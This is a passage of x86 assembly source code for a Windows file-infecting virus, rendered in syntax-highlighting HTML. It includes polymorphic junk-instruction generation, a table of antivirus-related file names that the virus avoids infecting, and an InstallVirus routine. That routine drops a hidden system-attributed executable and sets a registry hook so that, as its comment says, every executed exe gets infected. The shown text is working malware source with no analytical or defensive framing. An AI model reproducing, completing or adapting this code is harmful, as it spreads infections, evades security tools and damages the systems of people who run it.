    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">7h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0e8h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">81h</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">exitsa</span><span class="sc0">
</span><span class="sc5">sub_f</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">7h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0e8h</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0ech</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">noesp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">81h</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">7h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0c0h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">81h</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
</span><span class="sc5">exitsa</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">OneByte</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">;gen one byte do nothing instruction</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenRandomNumber</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">32h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">byte1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">end_get_byte</span><span class="sc0">
</span><span class="sc5">byte1</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">64h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">byte2</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0f8h</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">end_get_byte</span><span class="sc0">
</span><span class="sc5">byte2</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">96h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">byte3</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0f5h</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">end_get_byte</span><span class="sc0">
</span><span class="sc5">byte3</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0c8h</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">byte4</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0f9h</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">end_get_byte</span><span class="sc0">
</span><span class="sc5">byte4</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0fch</span><span class="sc0">
</span><span class="sc5">end_get_byte</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">




    
</span><span class="sc1">;check if file is related to av programs or canot be infected</span><span class="sc0">
</span><span class="sc1">;input:</span><span class="sc0">
</span><span class="sc1">;esi - file name</span><span class="sc0">
</span><span class="sc1">;output:</span><span class="sc0">
</span><span class="sc1">;carry flag</span><span class="sc0">

</span><span class="sc5">CheckFileName</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FileToInfect</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">@checkV</span><span class="sc4">:</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc12">'v'</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">badfile</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc12">'V'</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">badfile</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">no_v</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@checkV</span><span class="sc0">
</span><span class="sc5">no_v</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">         </span><span class="sc1">;save file name for later use</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">TwoBytesNames</span><span class="sc0">   </span><span class="sc1">;scan for 2 bytes bad name</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">DontInfectTable</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">l2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">l2_1</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">ex_rs</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">2020h</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">ex_rs</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">2020h</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">l2_1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;restore file name  </span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">2h</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">l2</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">FourBytesNames</span><span class="sc0">  </span><span class="sc1">;scan for 4 bytes bad name</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">DontInfectTable</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc5">TwoBytesNames</span><span class="sc4">)]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;get file name</span><span class="sc0">
</span><span class="sc5">l3</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">l3_1</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">ex_rs</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">20202020h</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">ex_rs</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">20202020h</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">l3_1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">4h</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">l3</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">stc</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">ex_rs</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc5">badfile</span><span class="sc4">:</span><span class="sc6">clc</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
    
</span><span class="sc5">DontInfectTable</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"FP"</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"TB"</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"AW"</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"DR"</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"F-"</span><span class="sc0">
    </span><span class="sc5">TwoBytesNames</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"INOC"</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"PAND"</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"ANTI"</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"AMON"</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"N32S"</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"NOD3"</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"NPSS"</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"SMSS"</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"SCAN"</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"ZONE"</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"PROT"</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"MONI"</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"RWEB"</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"MIRC"</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"CKDO"</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"TROJ"</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"SAFE"</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"JEDI"</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"TRAY"</span><span class="sc0">      
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"ANDA"</span><span class="sc0">  
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"SPID"</span><span class="sc0">      
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"PLOR"</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"NDLL"</span><span class="sc0">      
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"TREN"</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"NSPL"</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"NSCH"</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"ALER"</span><span class="sc0">
    
    </span><span class="sc5">FourBytesNames</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">27</span><span class="sc0">
    
</span><span class="sc5">InstallVirus</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0ffh</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">VirusFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">GetModuleFileName</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;get infected file name</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0ffh</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Buffer</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">GetSystemDirectory</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;get windows directory</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">ExitInstall</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ExeHookerName</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Buffer</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">lstrcat</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">ExitInstall</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CreateVirusFile</span><span class="sc0">         </span><span class="sc1">;create a exe that has only virus insaid</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">FILE_ATTRIBUTE_READONLY</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">FILE_ATTRIBUTE_HIDDEN</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">FILE_ATTRIBUTE_SYSTEM</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Buffer</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SetFileAttributes</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;hide the virus exe file hooker</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hkey</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">KEY_WRITE</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ExeHookKey</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">HKEY_CLASSES_ROOT</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">RegOpenKeyEx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">ExitInstall</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Buffer</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ExeHookerValue</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">lstrcat</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">closkey</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ExeHookerEndOfValue</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ExeHookerValue</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">lstrcat</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">closkey</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ExeHookerValue</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">@counts</span><span class="sc4">:</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">@counts</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ExeHookerValue</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">REG_SZ</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hkey</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;set virus hook at registry</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">RegSetValueEx</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;now every exe file that execute will get infected  </span><span class="sc0">
</span><span class="sc5">closkey</span><span class="sc4">:</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">hkey</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">RegCloseKey</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">ExitInstall</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
    
